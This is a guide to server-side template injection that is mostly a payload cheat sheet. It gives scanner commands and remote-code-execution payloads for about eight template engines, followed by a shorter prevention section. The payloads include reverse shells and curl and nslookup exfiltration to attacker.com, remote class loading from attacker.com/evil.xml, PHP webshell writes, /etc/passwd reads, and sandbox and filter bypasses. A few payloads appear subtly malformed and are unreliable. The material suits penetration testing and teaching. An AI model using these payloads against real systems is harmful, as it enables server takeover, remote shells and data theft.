# Server-Side Template Injection (SSTI) - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Template Engines Overview](#template-engines-overview)
3. [Detection Techniques](#detection-techniques)
4. [Scanning Tools](#scanning-tools)
5. [Exploitation by Engine](#exploitation-by-engine)
6. [Advanced Techniques](#advanced-techniques)
7. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

Server-Side Template Injection (SSTI) occurs when user input is embedded in a template in an unsafe manner, allowing attackers to inject template directives and achieve Remote Code Execution (RCE).

**Impact**:
- Remote Code Execution
- Full server compromise
- Data exfiltration
- Privilege escalation
- Internal network access

**Common Vulnerable Patterns**:
- User-controlled template content
- Dynamic template construction
- Unsafe rendering of user input
- Custom template features

---

## Template Engines Overview

### Popular Template Engines

| Engine | Language | Syntax | Common In |
|--------|----------|--------|-----------|
| Jinja2 | Python | `{{ }}` `{% %}` | Flask, Django |
| Twig | PHP | `{{ }}` `{% %}` | Symfony |
| FreeMarker | Java | `${}` `<#>` | Spring |
| Velocity | Java | `${}` `#set` | Legacy apps |
| Thymeleaf | Java | `${}` `th:` | Spring Boot |
| Smarty | PHP | `{}` | Legacy PHP |
| ERB | Ruby | `<%= %>` | Rails |
| Pug | Node.js | `-` indentation | Express |
| Handlebars | Node.js | `{{ }}` | Express |
| Tornado | Python | `{{ }}` | Tornado web |

---

## Detection Techniques

### Step 1: Identify Template Injection Points

**Common Locations**:
```
- Custom page creators
- Email template editors
- PDF generators with custom templates
- Markdown renderers
- Preview features
- Name fields (business cards, certificates)
- Subject lines
- Notification messages
```

### Step 2: Probe for Template Processing

**Mathematical Expression Tests**:
```
{{7*7}}           # Most engines
${7*7}            # FreeMarker, Velocity, Thymeleaf
<%= 7*7 %>        # ERB
${ 7*7 }          # JavaScript template literals
#{7*7}            # Some engines
*{7*7}            # Thymeleaf
@(7*7)            # Razor
```

**Expected Results**:
```
Vulnerable: Output is 49
Not Vulnerable: Output is {{7*7}} or ${7*7} (literal)
```

### Step 3: Identify Template Engine

**Polyglot Detection Payload**:
```
{{7*'7'}} ${7*'7'} <%= 7*'7' %> ${ 7*'7' } #{7*'7'} *{7*'7'}
```

**Response Analysis**:
```
49:         Numeric multiplication (Twig, Jinja2 without strict)
7777777:    String repetition (Jinja2, Python-based)
Error:      Type mismatch (helps identify language)
```

**Specific Tests**:
```
# Jinja2
{{7*'7'}}  → 7777777

# Twig
{{7*'7'}}  → 49

# FreeMarker
${7*7}     → 49

# Velocity
#set($x=7*7)$x  → 49

# Smarty
{7*7}      → 49

# ERB
<%= 7*7 %> → 49
```

---

## Scanning Tools

### 1. tplmap

```bash
# Basic scan
python tplmap.py -u 'https://target.com/page?name=test'

# POST request
python tplmap.py -u 'https://target.com/page' -d 'name=test&template=test'

# Specific template engine
python tplmap.py -u 'https://target.com/page?name=test' -e Jinja2

# OS command execution
python tplmap.py -u 'https://target.com/page?name=test' --os-cmd 'id'

# OS shell
python tplmap.py -u 'https://target.com/page?name=test' --os-shell

# Template shell (execute template code)
python tplmap.py -u 'https://target.com/page?name=test' --tpl-shell

# File upload
python tplmap.py -u 'https://target.com/page?name=test' --upload /path/to/shell.php

# Bind shell
python tplmap.py -u 'https://target.com/page?name=test' --bind-shell 4444

# Reverse shell
python tplmap.py -u 'https://target.com/page?name=test' --reverse-shell attacker.com 4444

# Cookie-based injection
python tplmap.py -u 'https://target.com/page' -c 'template=*' -H 'Cookie: template=test'

# Custom headers
python tplmap.py -u 'https://target.com/page?name=test' -H 'Authorization: Bearer TOKEN'

# Proxy
python tplmap.py -u 'https://target.com/page?name=test' --proxy http://127.0.0.1:8080

# Verbose
python tplmap.py -u 'https://target.com/page?name=test' -v
```

### 2. SSTImap

```bash
# Basic scan
python sstimap.py -u 'https://target.com/page?name=test'

# Interactive mode
python sstimap.py -i

# Smart mode (auto-detect engine)
python sstimap.py -u 'https://target.com/page?name=test' -s

# Force specific engine
python sstimap.py -u 'https://target.com/page?name=test' -e Jinja2

# Execute OS command
python sstimap.py -u 'https://target.com/page?name=test' --os-cmd "whoami"

# OS shell
python sstimap.py -u 'https://target.com/page?name=test' --os-shell

# Upload file
python sstimap.py -u 'https://target.com/page?name=test' --upload local.txt:remote.txt

# Download file
python sstimap.py -u 'https://target.com/page?name=test' --download /etc/passwd

# POST data
python sstimap.py -u 'https://target.com/page' -d 'template=test'

# Custom marker
python sstimap.py -u 'https://target.com/page' -d 'template=*inject*'

# Level (thoroughness)
python sstimap.py -u 'https://target.com/page?name=test' --level 5
```

### 3. Burp Suite

**Manual Testing (Repeater)**:
```
1. Identify template parameter
2. Test with: {{7*7}}, ${7*7}, etc.
3. Observe response for "49"
4. Escalate to RCE payloads
```

**Intruder Fuzzing**:
```
1. Send request to Intruder
2. Mark injection point
3. Load SSTI payload list
4. Grep for: "49", "7777777", errors
5. Analyze successful payloads
```

**Useful Extensions**:
- **Param Miner**: Discover hidden parameters
- **Server-Side Template Injection Scanner**

### 4. Manual Testing

**curl**:
```bash
# Test Jinja2
curl "https://target.com/page?name={{7*7}}"

# Test with URL encoding
curl "https://target.com/page?name=%7B%7B7*7%7D%7D"

# POST request
curl -X POST https://target.com/page -d "template={{7*7}}"
```

**Python Script**:
```python
import requests

payloads = {
    'Jinja2': "{{7*'7'}}",
    'Twig': "{{7*'7'}}",
    'FreeMarker': "${7*7}",
    'Velocity': "#set($x=7*7)$x",
    'ERB': "<%= 7*7 %>"
}

url = "https://target.com/page?name="

for engine, payload in payloads.items():
    r = requests.get(url + payload)
    if '49' in r.text or '7777777' in r.text:
        print(f'[+] Possible {engine} SSTI')
        print(f'    Payload: {payload}')
        print(f'    Response: {r.text[:100]}')
```

---

## Exploitation by Engine

### Jinja2 (Python/Flask)

**Detection**:
```python
{{7*7}}  → 49
{{7*'7'}}  → 7777777
```

**Basic RCE**:
```python
# Access config
{{config}}
{{config.items()}}

# __class__ → __base__ → __subclasses__ → RCE
{{''.__class__.__mro__[1].__subclasses__()}}

# Find useful class (e.g., subprocess.Popen)
{{''.__class__.__mro__[1].__subclasses__()[X]}}  # X = index of useful class

# Common RCE payloads
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{cycler.__init__.__globals__.os.popen('id').read()}}

{{joiner.__init__.__globals__.os.popen('id').read()}}

{{namespace.__init__.__globals__.os.popen('id').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read()}}
```

**Bypass Filters**:
```python
# If 'config' blocked
{{self._TemplateReference__context}}

# If '.' blocked
{{config['__class__']}}
{{config|attr('__class__')}}

# If '__' blocked
{{% set chr=cycler.__init__.__globals__.__builtins__.chr %}}

# If 'os' blocked
{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
```

### Twig (PHP/Symfony)

**Detection**:
```php
{{7*7}}  → 49
{{7*'7'}}  → 49 (not 777...)
```

**RCE Payloads**:
```php
# _self to access Twig_Environment
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# map filter with callback
{{['id']|map('system')|join(',')}}
{{{'id':'ls'}|map('system')}}

# Using filter callback
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Object injection
{{app.request.server.all|join(',')}}
```

**Twig 3.x (More restricted)**:
```php
# Use arrow functions (PHP 7.4+)
{{["id"]|filter(v => v == "id")|map(v => system(v))}}

# Sandbox escape
{{constant('system')('id')}}
```

### FreeMarker (Java)

**Detection**:
```
${7*7}  → 49
```

**RCE Payloads**:
```java
// Execute command (built-in execute)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Object creation
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder",["calc.exe"]).start()}

// Execute with URLClassLoader
<#assign classLoader=object?api.class.getClassLoader()>
<#assign clazz=classLoader.loadClass("ClassPathXmlApplicationContext")>
<#assign bean=clazz.getConstructor([url.class]).newInstance(["http://attacker.com/evil.xml"])>

// API built-in (if enabled)
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)

**Detection**:
```
#set($x = 7 * 7)$x  → 49
```

**RCE Payloads**:
```java
// Class.forName to execute
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$i$str.valueOf($chr.toChars($out.read()))
#end

// Using ClassLoader
#set($e="exp")
#set($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
#set($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc=$e.getClass().forName("java.util.Scanner"))
#set($constructor=$sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
$scan.next()
#end
```

### ERB (Ruby on Rails)

**Detection**:
```ruby
<%= 7*7 %>  → 49
```

**RCE Payloads**:
```ruby
# Basic command execution
<%= system('id') %>
<%= `id` %>
<%= %x(id) %>

# Using IO.popen
<%= IO.popen('id').readlines() %>

# Kernel.exec (replaces current process)
<%= exec('id') %>

# Using open (deprecated but may work)
<%= open('|id').read %>

# Reverse shell
<%= system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"') %>
```

### Smarty (PHP)

**Detection**:
```php
{7*7}  → 49
```

**RCE Payloads**:
```php
# {php} tags (Smarty 2, disabled by default in Smarty 3)
{php}system('id');{/php}

# $smarty.template_object
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# {function} tag
{function name='x'}{php}system('id');{/php}{/function}{x}

# Static method call
{self::getStreamVariable("file:///etc/passwd")}

# Write shell
{Smarty_Internal_Write_File::writeFile('/var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>', self::clearConfig())}
```

### Tornado (Python)

**Detection**:
```python
{{7*7}}  → 49
```

**RCE Payloads**:
```python
# Import os module
{% import os %}{{os.system('id')}}

# Using __import__
{{__import__('os').popen('id').read()}}

# Through handler
{{handler.settings}}

# Reverse shell
{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')}}
```

### Pug (Node.js)

**Detection**:
```javascript
#{7*7}  → 49
```

**RCE Payloads**:
```javascript
// Code injection
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.com 4444')

// Shorter version
#{global.process.mainModule.require('child_process').execSync('id')}

// require from global
#{root.process.mainModule.constructor._load('child_process').exec('id')}
```

---

## Advanced Techniques

### 1. Sandbox Escape

**Jinja2 Sandbox Bypass**:
```python
# Access private attributes
{{x.__init__.__globals__}}

# Using attr filter
{{x|attr('__init__')|attr('__globals__')}}

# MRO (Method Resolution Order)
{{x.__class__.__mro__}}

# Subclasses enumeration
{{[].__class__.__base__.__subclasses__()}}
```

**Find File class index**:
```python
# List all subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Find index (example: 40)
# Then use for RCE
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

### 2. Filter Bypass

**Keyword Blacklist**:
```python
# If 'class' blacklisted
{{''.`__class__`}}  # Backticks
{{''['__class__']}}  # Bracket notation
{{''|attr('__class__')}}  # attr filter

# If 'config' blacklisted
{{self._TemplateReference__context.config}}
{{request.application.__self__._get_data_for_json}}

# String concatenation
{{'__cla'+'ss__'}}
{%set x='__cla' ~ 'ss__' %}
```

**Character Filters**:
```python
# If quotes filtered
{{request.args.x}}  # Pass via URL parameter ?x=os
{{request.cookies.x}}
{{request.form.x}}

# If parentheses filtered (rare)
{% set os=config.__class__.__init__.__globals__['os'] %}
{% set popen=os.popen %}
{% set cmd=request.args.cmd %}
{{popen(cmd).read()}}
```

### 3. Blind SSTI

**Time-Based Detection**:
```python
# Jinja2 sleep
{{config.__class__.__init__.__globals__['time'].sleep(5)}}

# Python sleep via import
{%import time%}{{time.sleep(5)}}
```

**OOB Exfiltration**:
```python
# DNS exfiltration
{{config.__class__.__init__.__globals__['os'].popen('nslookup $(whoami).attacker.com').read()}}

# HTTP exfiltration
{{config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com/$(whoami)').read()}}
```

### 4. Template Polyglots

**Multi-Engine Payload**:
```
${{<%[%'"}}%\.{{7*7}}
```

Tests multiple syntaxes simultaneously.

---

## Prevention & Mitigation

### 1. Never Trust User Input in Templates

```python
# BAD - User input directly in template
template = Template("Hello " + user_input)
output = template.render()

# GOOD - User input as variable
template = Template("Hello {{ name }}")
output = template.render(name=user_input)
```

### 2. Use Sandboxed Environments

**Jinja2 Sandbox**:
```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
output = template.render(name=user_input)
```

**Note**: Sandboxes can be bypassed. Don't rely solely on them.

### 3. Whitelist Allowed Templates

```python
# Store templates in database/files with IDs
allowed_templates = {
    1: "Hello {{ name }}",
    2: "Welcome {{ user }}"
}

template_id = int(request.args.get('id'))
if template_id in allowed_templates:
    template = Template(allowed_templates[template_id])
else:
    return "Invalid template"
```

### 4. Disable Dangerous Features

**Jinja2**:
```python
from jinja2 import Environment

env = Environment()
env.globals.clear()  # Remove globals
env.filters.clear()  # Remove filters

# Whitelist safe filters only
env.filters['safe'] = lambda x: x
```

**Twig**:
```php
$twig = new \Twig\Environment($loader, [
    'autoescape' => 'html',
    'strict_variables' => true,
    'sandbox' => true
]);

$policy = new \Twig\Sandbox\SecurityPolicy(
    ['if'],  // allowed tags
    ['upper', 'lower'],  // allowed filters
    [],  // allowed methods
    [],  // allowed properties
    []   // allowed functions
);

$sandbox = new \Twig\Extension\SandboxExtension($policy, true);
$twig->addExtension($sandbox);
```

### 5. Input Validation

```python
# Reject template syntax characters
import re

if re.search(r'[{}<>%]', user_input):
    return "Invalid characters"

# Whitelist alphanumeric + spaces
if not re.match(r'^[a-zA-Z0-9\s]+$', user_input):
    return "Invalid input"
```

### 6. Principle of Least Privilege

```python
# Run application with minimal OS permissions
# Template engine shouldn't need:
# - File write access
# - Network access
# - Execute permissions

# Use Docker/containers to isolate
```

### 7. Content Security Policy

```python
# Add CSP headers to prevent data exfiltration
response.headers['Content-Security-Policy'] = "default-src 'self'"
```

### 8. Monitoring and Logging

```python
import logging

# Log all template rendering
logging.info(f"Rendering template with input: {user_input}")

# Alert on suspicious patterns
if '{{' in user_input or '<%' in user_input:
    logging.warning(f"Possible SSTI attempt: {user_input}")
```

### Security Checklist

- [ ] User input never directly concatenated into templates
- [ ] Sandboxed template environment used
- [ ] Template selection via whitelist, not user input
- [ ] Dangerous functions/filters disabled
- [ ] Input validation rejects template syntax
- [ ] Application runs with minimal privileges
- [ ] CSP headers implemented
- [ ] Logging and monitoring for SSTI patterns
- [ ] Regular security audits of template code
- [ ] Template engines kept updated

---

**Additional Resources**:
- PortSwigger SSTI Tutorial
- HackTricks - SSTI
- PayloadsAllTheThings - SSTI
- James Kettle - Server-Side Template Injection
